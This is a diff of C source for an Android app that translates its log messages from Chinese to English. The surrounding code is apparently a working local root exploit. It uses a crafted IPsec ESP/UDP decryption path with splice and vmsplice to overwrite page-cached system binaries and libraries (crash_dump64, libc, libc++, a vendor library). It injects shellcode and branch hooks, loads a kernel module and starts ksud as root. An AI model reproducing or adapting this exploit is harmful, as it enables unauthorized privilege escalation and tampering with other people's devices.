@@ -63,7 +63,7 @@ static int      g_sender_port;
 static uint32_t g_spi;
 static uint8_t  g_aes_key[32];
 static uint8_t  g_hmac_key[32];
-static int      g_icv_len;    /* auth truncation in bytes (128-bit → 16) */
+static int      g_icv_len;    /* auth truncation in bytes (128-bit -> 16) */
 static uint32_t g_seq = 1;   /* monotonically increasing per-write */
 
 /* IV = AES256_ECB_DEC(key, old_content) XOR desired
@@ -84,14 +84,14 @@ static void compute_iv(const uint8_t old_content[16], const uint8_t desired[16],
  */
 static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *reporter) {
     int rdpipe[2];
-    if (pipe(rdpipe) < 0) { REPORTLN("创建管道失败: %s", strerror(errno)); return -1; }
+    if (pipe(rdpipe) < 0) { REPORTLN("pipe creation failed: %s", strerror(errno)); return -1; }
 
     char offstr[24];
     snprintf(offstr, sizeof(offstr), "%ld", (long)offset);
 
     int pid = (int)syscall(__NR_clone, SIGCHLD | CLONE_VFORK | CLONE_VM, 0, 0, 0, 0);
     if (pid < 0) {
-        REPORTLN("vfork 失败: %s", strerror(errno));
+        REPORTLN("vfork failed: %s", strerror(errno));
         close(rdpipe[0]); close(rdpipe[1]);
         return -1;
     }
@@ -113,13 +113,13 @@ static int read_vendor_content(off_t offset, uint8_t buf[16], struct Reporter *r
     close(rdpipe[0]);
     if (n != 16) {
         if (WIFEXITED(status))
-            REPORTLN("读取 vendor 文件 0x%lx 只拿到 %d 字节（退出码 %d）",
+            REPORTLN("vendor file read at 0x%lx got only %d bytes (exit code %d)",
                      (long)offset, n, WEXITSTATUS(status));
         else if (WIFSIGNALED(status))
-            REPORTLN("读取 vendor 文件 0x%lx 只拿到 %d 字节（信号 %d）",
+            REPORTLN("vendor file read at 0x%lx got only %d bytes (signal %d)",
                      (long)offset, n, WTERMSIG(status));
         else
-            REPORTLN("读取 vendor 文件 0x%lx 只拿到 %d 字节（状态 0x%x）",
+            REPORTLN("vendor file read at 0x%lx got only %d bytes (status 0x%x)",
                      (long)offset, n, status);
         return -1;
     }
@@ -159,7 +159,7 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
     /* vmsplice header + IV (24 bytes) */
     struct iovec iov1 = {.iov_base = hdr, .iov_len = 24};
     if (vmsplice(pfd[1], &iov1, 1, SPLICE_F_GIFT) != 24) {
-        REPORTLN("vmsplice 写 ESP 头失败: %s", strerror(errno)); goto out_pipe;
+        REPORTLN("vmsplice ESP header write failed: %s", strerror(errno)); goto out_pipe;
     }
 
     /* splice ciphertext from file (16 bytes, page-cache reference) */
@@ -176,28 +176,28 @@ static int do_one_write_cbc(int sk_send, int file_fd, off_t offset,
         int st;
         TEMP_FAILURE_RETRY(waitpid(pid, &st, 0));
         if (!(WIFEXITED(st) && WEXITSTATUS(st) == 0)) {
-            REPORTLN("splice 辅助进程失败 status=0x%x", st);
+            REPORTLN("splice helper process failed status=0x%x", st);
             goto out_pipe;
         }
     } else {
         off_t off = offset;
         if (splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE) != 16) {
-            REPORTLN("splice 文件失败: %s", strerror(errno)); goto out_pipe;
+            REPORTLN("splice file failed: %s", strerror(errno)); goto out_pipe;
         }
     }
 
     /* vmsplice ICV (truncated HMAC) */
     struct iovec iov2 = {.iov_base = hmac_full, .iov_len = (size_t)g_icv_len};
     if (vmsplice(pfd[1], &iov2, 1, SPLICE_F_GIFT) != g_icv_len) {
-        REPORTLN("vmsplice 写 ICV 失败: %s", strerror(errno)); goto out_pipe;
+        REPORTLN("vmsplice ICV write failed: %s", strerror(errno)); goto out_pipe;
     }
 
-    /* splice pipe → UDP: 24 + 16 + icv_len bytes */
+    /* splice pipe -> UDP: 24 + 16 + icv_len bytes */
     {
         int total = 24 + 16 + g_icv_len;
         ssize_t s = splice(pfd[0], NULL, sk_send, NULL, total, 0);
         ret = (s == total) ? 0 : -1;
-        if (ret) REPORTLN("splice 管道->UDP: %zd，期望 %d", s, total);
+        if (ret) REPORTLN("splice pipe->UDP: %zd, expected %d", s, total);
     }
 
 out_pipe:
@@ -214,12 +214,12 @@ out_pipe:
 static int patch_file_cbc(const char *path, const char *payload, size_t len,
                            size_t foff, int use_helper, struct Reporter *reporter) {
     if (len % 16 != 0) {
-        REPORTLN("patch_file_cbc: len=%zu 不是 16 的整数倍", len);
+        REPORTLN("patch_file_cbc: len=%zu not a multiple of 16", len);
         return -1;
     }
 
     int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sk_send < 0) { REPORTLN("创建 socket 失败: %s", strerror(errno)); return -1; }
+    if (sk_send < 0) { REPORTLN("socket creation failed: %s", strerror(errno)); return -1; }
     {
         int opt = 1;
         setsockopt(sk_send, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
@@ -229,14 +229,14 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
         };
         if (bind(sk_send, (struct sockaddr *)&src, sizeof(src)) < 0)
-            REPORTLN("绑定端口 %d 失败: %s", g_sender_port, strerror(errno));
+            REPORTLN("bind to port %d failed: %s", g_sender_port, strerror(errno));
         struct sockaddr_in dst = {
             .sin_family = AF_INET,
             .sin_port   = htons((uint16_t)g_encap_port),
             .sin_addr   = {.s_addr = htonl(INADDR_LOOPBACK)},
         };
         if (connect(sk_send, (struct sockaddr *)&dst, sizeof(dst)) < 0) {
-            REPORTLN("connect 失败: %s", strerror(errno));
+            REPORTLN("connect failed: %s", strerror(errno));
             close(sk_send); return -1;
         }
     }
@@ -245,7 +245,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
     if (!use_helper) {
         file_fd = open(path, O_RDONLY);
         if (file_fd < 0) {
-            REPORTLN("打开 %s 失败: %s", path, strerror(errno));
+            REPORTLN("failed to open %s: %s", path, strerror(errno));
             close(sk_send); return -1;
         }
     }
@@ -261,7 +261,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
             }
         } else {
             if (pread(file_fd, old_content, 16, off) != 16) {
-                REPORTLN("pread 0x%lx 失败: %s", (long)off, strerror(errno));
+                REPORTLN("pread 0x%lx failed: %s", (long)off, strerror(errno));
                 rc = -1; break;
             }
         }
@@ -273,7 +273,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
         compute_iv(old_content, desired, iv);
 
         if (do_one_write_cbc(sk_send, file_fd, off, iv, old_content, use_helper, reporter) < 0) {
-            REPORTLN("第 %zu 次写入 0x%lx 失败", i, (long)off);
+            REPORTLN("write #%zu to 0x%lx failed", i, (long)off);
             rc = -1; break;
         }
         if (i % 32 == 0)
@@ -282,7 +282,7 @@ static int patch_file_cbc(const char *path, const char *payload, size_t len,
 
     if (!use_helper) close(file_fd);
     close(sk_send);
-    if (rc == 0) REPORTLN("已写入 %zu 字节到 %s+0x%zx", len, path, foff);
+    if (rc == 0) REPORTLN("wrote %zu bytes to %s+0x%zx", len, path, foff);
     return rc;
 }
 
@@ -385,13 +385,13 @@ static int patch_ko(struct Reporter *reporter) {
     /* pick KO image */
     int andr = 0, major = 0, minor = 0;
     if (read_device_versions(&andr, &major, &minor) != 0) {
-        REPORTLN("内核版本检测失败"); return 1;
+        REPORTLN("kernel version detection failed"); return 1;
     }
     const struct KoImage *ko = select_ko_image(andr, major, minor);
     if (!ko) {
-        REPORTLN("不支持的内核 %d.%d android %d", major, minor, andr); return 1;
+        REPORTLN("unsupported kernel %d.%d android %d", major, minor, andr); return 1;
     }
-    REPORTLN("* 内核模块 android%d-%d.%d（%d 字节）",
+    REPORTLN("* kernel module android%d-%d.%d (%d bytes)",
              ko->android_release, ko->kver_major, ko->kver_minor,
              (int)(ko->end - ko->start));
 
@@ -403,20 +403,20 @@ static int patch_ko(struct Reporter *reporter) {
                          (size_t)(splice_helper_end - splice_helper_start),
                          &sh_len_padded);
     if (!sh_buf) return -1;
-    REPORTLN("* 补丁 #1（crash_dump64 ← splicehelper，%zu 字节）", sh_len_padded);
+    REPORTLN("* patch #1 (crash_dump64 <- splicehelper, %zu bytes)", sh_len_padded);
     int ret = patch_file_cbc(kCrashDump, sh_buf, sh_len_padded, 0, 0, reporter);
     free(sh_buf);
-    if (ret) { REPORTLN("补丁 #1 失败: %d", ret); return ret; }
+    if (ret) { REPORTLN("patch #1 failed: %d", ret); return ret; }
 
     size_t ko_len_padded;
     char *ko_buf = pad16(ko->start, (size_t)(ko->end - ko->start), &ko_len_padded);
     if (!ko_buf) return -1;
 
     /* patch #2: write KO into vendor lib via crash_dump bridge */
-    REPORTLN("* 补丁 #2（libstagefrighthw.so ← dirtyfrag.ko，%zu 字节）", ko_len_padded);
+    REPORTLN("* patch #2 (libstagefrighthw.so <- dirtyfrag.ko, %zu bytes)", ko_len_padded);
     ret = patch_file_cbc(target_lib_path, ko_buf, ko_len_padded, 0, 1, reporter);
     free(ko_buf);
-    if (ret) REPORTLN("补丁 #2 失败: %d", ret);
+    if (ret) REPORTLN("patch #2 failed: %d", ret);
     return ret;
 }
 
@@ -426,16 +426,16 @@ static int patch_hook(const char *lib, const char *sym,
                       struct Reporter *reporter, struct PatchRestore *restore) {
     uint64_t hook_off, shell_off; uint32_t first_insn;
     if (find_hook_target(lib, sym, &hook_off, &shell_off, &first_insn)) {
-        REPORTLN("在 %s 中找不到挂钩点", lib); return 1;
+        REPORTLN("hook point not found in %s", lib); return 1;
     }
-    REPORTLN("%s 挂钩=0x%lx shell=0x%lx 长度=%u", lib, hook_off, shell_off, stage_len);
+    REPORTLN("%s hook=0x%lx shell=0x%lx len=%u", lib, hook_off, shell_off, stage_len);
 
     const uint32_t BRANCH = 0x14000000;
     uint32_t start_delta = (uint32_t)(stage_start - stage_data);
     uint32_t hook_insn = BRANCH | (((shell_off + start_delta - hook_off) >> 2) & 0x3ffffff);
 
     if (first_insn == hook_insn) {
-        REPORTLN("%s 已经挂过钩了", lib); return 0;
+        REPORTLN("%s is already hooked", lib); return 0;
     }
     uint32_t jmpback = BRANCH |
         (((hook_off + 4) - (shell_off + stage_len - 4)) >> 2 & 0x3ffffff);
@@ -459,10 +459,10 @@ static int patch_hook(const char *lib, const char *sym,
         }
     }
 
-    REPORTLN("* 正在写入 %s 的 shellcode", lib);
+    REPORTLN("* writing shellcode into %s", lib);
     int ret = patch_file_cbc(lib, buf, padded, shell_off, 0, reporter);
     free(buf);
-    if (ret) { REPORTLN("* 写入 %s 的 shellcode 失败", lib); return ret; }
+    if (ret) { REPORTLN("* failed to write shellcode into %s", lib); return ret; }
 
     {
         uint64_t aligned = hook_off & ~(uint64_t)15;
@@ -470,7 +470,7 @@ static int patch_hook(const char *lib, const char *sym,
         uint8_t blk[16];
         int fd = open(lib, O_RDONLY);
         if (fd < 0 || pread(fd, blk, 16, (off_t)aligned) != 16) {
-            REPORTLN("pread %s 跳转块失败", lib); if (fd >= 0) close(fd); return -1;
+            REPORTLN("pread of %s jump block failed", lib); if (fd >= 0) close(fd); return -1;
         }
         close(fd);
         if (restore) {
@@ -482,7 +482,7 @@ static int patch_hook(const char *lib, const char *sym,
         blk[pos+1] = (uint8_t)(hook_insn >>  8);
         blk[pos+2] = (uint8_t)(hook_insn >> 16);
         blk[pos+3] = (uint8_t)(hook_insn >> 24);
-        REPORTLN("* 正在写入 %s 的跳转指令，位置 0x%lx", lib, hook_off);
+        REPORTLN("* writing jump instruction into %s at 0x%lx", lib, hook_off);
         ret = patch_file_cbc(lib, (char *)blk, 16, (size_t)aligned, 0, reporter);
     }
     return ret;
@@ -490,25 +490,25 @@ static int patch_hook(const char *lib, const char *sym,
 
 static void restore_hook(struct PatchRestore *r, struct Reporter *reporter) {
     if (!r->valid) return;
-    REPORTLN("* 还原 %s 的跳转指令", r->lib);
+    REPORTLN("* restoring jump instruction of %s", r->lib);
     patch_file_cbc(r->lib, (char *)r->tramp_orig, 16, (size_t)r->tramp_aligned, 0, reporter);
     if (r->shell_orig) {
-        REPORTLN("* 还原 %s 的 shellcode", r->lib);
+        REPORTLN("* restoring shellcode of %s", r->lib);
         patch_file_cbc(r->lib, r->shell_orig, r->shell_padded, (size_t)r->shell_off, 0, reporter);
     }
 }
 
 static void fadvise_drop(const char *path, struct Reporter *reporter) {
     int fd = open(path, O_RDONLY);
-    if (fd < 0) { REPORTLN("fadvise_drop 打开 %s 失败: %s", path, strerror(errno)); return; }
+    if (fd < 0) { REPORTLN("fadvise_drop failed to open %s: %s", path, strerror(errno)); return; }
     posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
     close(fd);
-    REPORTLN("* 已丢弃缓存: %s", path);
+    REPORTLN("* dropped page cache: %s", path);
 }
 
 static int createOrphanProcess(struct Reporter *reporter) {
     int pid = fork();
-    if (pid < 0) { REPORTLN("fork 失败: %s", strerror(errno)); return -1; }
+    if (pid < 0) { REPORTLN("fork failed: %s", strerror(errno)); return -1; }
     if (pid == 0) {
         int pid2 = fork();
         if (pid2 == 0) { sleep(1); _exit(0); }
@@ -544,7 +544,7 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
     memcpy(g_hmac_key, hb, 32);
     (*env)->ReleaseByteArrayElements(env, hmacKey, hb, JNI_ABORT);
 
-    REPORTLN("封装端口=%d spi=0x%x", g_encap_port, g_spi);
+    REPORTLN("encap port=%d spi=0x%x", g_encap_port, g_spi);
 
     // Create memfd holding ksud; patch its /proc/self/fd/<n> path into libc.
     int ksud_mfd = -1;
@@ -569,7 +569,7 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
                 strncpy(libc_data + libc_ksud_proc_path_off, proc_path, 63);
                 libc_data[libc_ksud_proc_path_off + 63] = '\0';
                 libc_data[libc_skip_soft_reboot_off] = skipSoftReboot ? 1 : 0;
-                REPORTLN("ksud 内存文件: %s", proc_path);
+                REPORTLN("ksud memfd: %s", proc_path);
             }
             close(src);
         }
@@ -589,7 +589,7 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
 
     rc = 2;
     usleep(500000);
-    REPORTLN("* 正在触发……");
+    REPORTLN("* triggering...");
     createOrphanProcess(reporter);
 
     static const struct {
@@ -598,14 +598,14 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
         int terminal;
         int success;
     } markers[] = {
-        { "/dev/df",    "libc++：已抢到互斥锁，正在 fork",           0, 0 },
-        { "/dev/dfm1",  "libc：已在 modprobe 中运行",                0, 0 },
-        { "/dev/dfm0",  "libc：正在从内存文件复制 ksud",            0, 0 },
-        { "/dev/dfmf",  "libc：打开内存文件失败",                  0, 0 },
-        { "/dev/dfm2",  "libc：已隔离 mount 命名空间",                 0, 0 },
-        { "/dev/dfm3",  "libc：bind mount 完成，正在启动 ksud……",    0, 0 },
-        { "/dev/dfm6",  "成功：ksud 已启动",                    1, 1 },
-        { "/dev/dfm4",  "失败：execve ksud 未成功",               1, 0 },
+        { "/dev/df",    "libc++: mutex acquired, forking",           0, 0 },
+        { "/dev/dfm1",  "libc: now running inside modprobe",                0, 0 },
+        { "/dev/dfm0",  "libc: copying ksud from memfd",            0, 0 },
+        { "/dev/dfmf",  "libc: failed to open memfd",                  0, 0 },
+        { "/dev/dfm2",  "libc: mount namespace isolated",                 0, 0 },
+        { "/dev/dfm3",  "libc: bind mount done, starting ksud...",    0, 0 },
+        { "/dev/dfm6",  "Success: ksud started",                    1, 1 },
+        { "/dev/dfm4",  "Failed: execve of ksud did not succeed",               1, 0 },
     };
     int seen[sizeof(markers)/sizeof(markers[0])] = {0};
 
@@ -624,14 +624,14 @@ Java_df_root_MainActivity_nativeRunAll(JNIEnv *env, jclass clz __attribute__((un
         }
         if (hit) goto done;
     }
-    REPORTLN("没有收到成功标志");
+    REPORTLN("never received the success marker");
 done:
     restore_hook(&libcxx_r, reporter);
     restore_hook(&libc_r, reporter);
     fadvise_drop(kCrashDump, reporter);
     free(libcxx_r.shell_orig);
     free(libc_r.shell_orig);
-    if (rc == 3) REPORTLN("补丁失败");
+    if (rc == 3) REPORTLN("patch failed");
     if (ksud_mfd >= 0) close(ksud_mfd);
     return rc;
 }
